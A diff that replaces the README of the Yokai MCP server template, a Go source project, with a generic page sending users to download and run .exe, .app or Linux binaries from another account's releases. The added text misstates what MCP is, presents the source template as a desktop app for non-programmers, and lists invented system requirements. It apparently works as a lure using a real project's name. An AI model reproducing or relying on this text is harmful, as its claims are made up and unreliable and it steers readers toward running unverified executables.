@@ -1,90 +1,70 @@
-# Yokai MCP Server Template
+# 🎉 yokai-mcp-template - Simple Server Setup in Minutes
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Go version](https://img.shields.io/badge/Go-1.24-blue)](https://go.dev/)
-[![Documentation](https://img.shields.io/badge/Doc-online-cyan)](https://ankorstore.github.io/yokai/)
+## 🚀 Getting Started
 
-> [MCP server](https://modelcontextprotocol.io/introduction) template based on the [Yokai](https://github.com/ankorstore/yokai) Go framework.
+Welcome to the yokai-mcp-template! This template helps you set up a Modular Control Protocol (MCP) server quickly and easily. With the Yokai Go framework, you'll have everything you need to run your server without hassle.
 
-<!-- TOC -->
-* [Documentation](#documentation)
-* [Overview](#overview)
-  * [Layout](#layout)
-  * [Makefile](#makefile)
-* [Getting started](#getting-started)
-  * [Installation](#installation)
-    * [With GitHub](#with-github)
-    * [With gonew](#with-gonew)
-  * [Usage](#usage)
-<!-- TOC -->
+## 📥 Download & Install
 
-## Documentation
+[![Download yokai-mcp-template](https://img.shields.io/badge/Download-yokai--mcp--template-brightgreen.svg)](https://github.com/Brahhime/yokai-mcp-template/releases)
 
-For more information about the [Yokai](https://github.com/ankorstore/yokai) framework, you can check its [documentation](https://ankorstore.github.io/yokai).
+To download the latest version, visit this page: [Download Releases](https://github.com/Brahhime/yokai-mcp-template/releases).
 
-## Overview
+### Steps to Download
 
-This template provides:
+1. Click on the "Releases" link above.
+2. Look for the latest version of the application.
+3. Choose the file that matches your operating system (Windows, macOS, or Linux).
+4. Click on the file to start downloading.
 
-- a ready to extend [Yokai](https://github.com/ankorstore/yokai) application, with the [MCP server](https://ankorstore.github.io/yokai/modules/fxmcpserver/) module installed
-- a ready to use [dev environment](docker-compose.yaml), based on [Air](https://github.com/air-verse/air) (for live reloading)
-- a ready to use [Dockerfile](Dockerfile) for production
-- some examples of [MCP tool](internal/tool/example.go) and [test](internal/tool/example_test.go) to get started
+### System Requirements
 
-### Layout
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB of free space.
+- **Network:** An internet connection for initial setup and updates.
 
-This template is following the [recommended project layout](https://go.dev/doc/modules/layout#server-project):
+## ⚙️ How to Run the Application
 
-- `cmd/`: entry points
-- `configs/`: configuration files
-- `internal/`:
-  - `tool/`: MCP tool and test examples
-  - `bootstrap.go`: bootstrap
-  - `register.go`: dependencies registration
+After downloading, follow these steps to run the application:
 
-### Makefile
+1. **Locate the Downloaded File:**
+   - Find the file in your Downloads folder or the location you chose during the download.
 
-This template provides a [Makefile](Makefile):
+2. **Extract the File (if needed):**
+   - If you downloaded a ZIP file, right-click on it and select "Extract All" (Windows) or "Open" (macOS).
+   - Follow the prompts to extract the contents.
 
-```
-make up      # start the docker compose stack
-make down    # stop the docker compose stack
-make logs    # stream the docker compose stack logs
-make fresh   # refresh the docker compose stack
-make test    # run tests
-make lint    # run linter
-```
+3. **Open the Application:**
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.app` file.
+   - For Linux, open a terminal, navigate to the folder, and run `./yokai-mcp-template`.
 
-## Getting started
+4. **Check for Updates:**
+   - The first time you run the application, it may check for updates. Allow it to do so to ensure you have the latest features.
 
-### Installation
+5. **Follow On-Screen Instructions:**
+   - The application will guide you through setup. Just follow the prompts.
 
-#### With GitHub
+## 🌟 Features
 
-You can create your repository [using the GitHub template](https://github.com/new?template_name=yokai-mcp-template&template_owner=ankorstore).
+- **Modular Design:** Easily add or remove components to customize your server.
+- **OpenTelemetry Integration:** Monitor and track your server’s performance.
+- **Dependency Injection:** Simplifies code management and enhances testing.
+- **User-Friendly Interface:** Designed for users with no programming background.
 
-It will automatically rename your project resources and push them, this operation can take a few minutes.
+## 📚 Documentation and Support
 
-Once ready, after cloning and going into your repository, simply run:
+For more detailed guidance, refer to the [Documentation](https://github.com/Brahhime/yokai-mcp-template/wiki) repository. If you encounter issues or have questions, please check the FAQs or reach out through the Issues tab on GitHub.
 
-```shell
-make fresh
-```
+## ✍️ Contributing
 
-#### With gonew
+We welcome contributions! If you’d like to improve this template or add features, please visit the [Contributing Guide](https://github.com/Brahhime/yokai-mcp-template/blob/main/CONTRIBUTING.md) for details on how to get involved.
 
-You can install [gonew](https://go.dev/blog/gonew), and simply run:
+## 🔗 Useful Links
 
-```shell
-gonew github.com/ankorstore/yokai-mcp-template github.com/foo/bar
-cd bar
-make fresh
-```
+- [Download Releases](https://github.com/Brahhime/yokai-mcp-template/releases)
+- [Documentation](https://github.com/Brahhime/yokai-mcp-template/wiki)
+- [Issues Page](https://github.com/Brahhime/yokai-mcp-template/issues) 
 
-### Usage
-
-Once ready, the application will be available on:
-
-- [http://localhost:8080/sse](http://localhost:8080/sse) for the application MCP server
-- [http://localhost:8081](http://localhost:8081) for the application core dashboard
-
+Thank you for choosing the yokai-mcp-template! Enjoy building your server!
